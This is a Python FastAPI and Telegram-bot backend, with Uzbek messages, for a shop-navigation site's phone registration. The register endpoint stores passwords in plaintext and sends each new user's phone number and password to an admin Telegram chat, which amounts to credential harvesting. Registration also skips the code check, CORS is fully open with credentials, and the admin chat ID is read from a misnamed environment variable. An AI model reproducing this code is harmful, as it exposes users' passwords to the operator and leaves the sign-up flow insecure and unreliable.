import os
import sys
import sqlite3
import random
import uvicorn
from typing import Optional
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import telebot

# Environment Variables'dan tokenni olish
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = os.getenv("8075439463")

if not BOT_TOKEN:
    print("XATOLIK: BOT_TOKEN topilmadi! Render Environment Variables bo'limiga BOT_TOKEN qo'shing.", file=sys.stderr)

app = FastAPI(title="Dokon Navigation API")
bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None

# CORS sozlamalari
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- DATABASE SOZLASH (SQLite) ---
DB_NAME = "database.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS temp_codes (
            phone TEXT PRIMARY KEY,
            code TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Pydantic Modellari
class VerifyRequest(BaseModel):
    phone: str
    code: str

class RegisterRequest(BaseModel):
    phone: str
    password: str

# --- TELEGRAM BOT HANDLERLARI ---
if bot:
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        btn = telebot.types.KeyboardButton(text="📱 Kontaktingizni yuboring", request_contact=True)
        markup.add(btn)
        bot.send_message(
            message.chat.id, 
            "Assalomu alaykum! Saytdan ro'yxatdan o'tish uchun pasdagi tugma orqali kontaktingizni yuboring.", 
            reply_markup=markup
        )

    @bot.message_handler(content_types=['contact'])
    def handle_contact(message):
        if message.contact is not None:
            phone = message.contact.phone_number
            if not phone.startswith('+'):
                phone = '+' + phone
            
            code = str(random.randint(100000, 999999))

            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            cursor.execute("INSERT OR REPLACE INTO temp_codes (phone, code) VALUES (?, ?)", (phone, code))
            conn.commit()
            conn.close()

            bot.send_message(
                message.chat.id,
                f"✅ Kontaktingiz qabul qilindi!\n\n🔑 Tasdiqlash kodingiz: `{code}`\n\nKodni saytga kiriting.",
                parse_mode="HTML"
            )

    import threading
    threading.Thread(target=bot.infinity_polling, daemon=True).start()

# --- API ENDPOINTS ---

@app.post("/api/verify")
def verify_code(req: VerifyRequest):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    phone = req.phone.strip()
    if not phone.startswith('+'):
        phone = '+' + phone

    cursor.execute("SELECT id FROM users WHERE phone = ?", (phone,))
    if cursor.fetchone():
        conn.close()
        raise HTTPException(status_code=400, detail="Sizning nomeringiz ro'yxatdan o'tgan!")

    cursor.execute("SELECT code FROM temp_codes WHERE phone = ?", (phone,))
    row = cursor.fetchone()
    conn.close()

    if row and row[0] == req.code.strip():
        return {"success": True, "message": "Kod to'g'ri!"}
    else:
        raise HTTPException(status_code=400, detail="Kod noto'g'ri kiritildi!")

@app.post("/api/register")
def register_user(req: RegisterRequest):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    phone = req.phone.strip()
    if not phone.startswith('+'):
        phone = '+' + phone

    try:
        cursor.execute("INSERT INTO users (phone, password) VALUES (?, ?)", (phone, req.password))
        cursor.execute("DELETE FROM temp_codes WHERE phone = ?", (phone,))
        conn.commit()
    except sqlite3.IntegrityError:
        conn.close()
        raise HTTPException(status_code=400, detail="Bu raqam allaqachon ro'yxatdan o'tgan!")
    
    conn.close()

    if bot:
        msg = (
            f"🎉 **Yangi foydalanuvchi ro'yxatdan o'tdi!**\n\n"
            f"📱 **Telefon:** `{phone}`\n"
            f"🔑 **Parol:** `{req.password}`"
        )
        try:
            bot.send_message(ADMIN_CHAT_ID, msg, parse_mode="HTML")
        except Exception as e:
            print(f"Telegram yuborishda xatolik: {e}")

    return {"success": True, "message": "Ro'yxatdan muvaffaqiyatli o'tdingiz!"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
